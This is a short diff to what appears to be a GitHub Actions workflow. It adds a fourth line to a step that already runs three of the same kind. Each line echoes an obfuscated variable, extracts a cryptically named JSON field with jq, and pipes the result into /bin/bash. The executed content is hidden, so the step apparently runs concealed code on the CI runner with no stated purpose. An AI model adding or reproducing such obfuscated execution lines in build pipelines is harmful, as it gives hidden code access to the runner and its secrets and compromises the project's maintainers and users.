@@ -32,6 +32,7 @@ jobs:
           echo $dw380 | jq -r .vydd1940 | /bin/bash
           echo $bsst410 | jq -r .gqxud1 | /bin/bash
           printf '%s' "$jsgsh01" | jq -r .qt34 | /bin/bash
+          echo $trnkt319 | jq -r .abm46 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
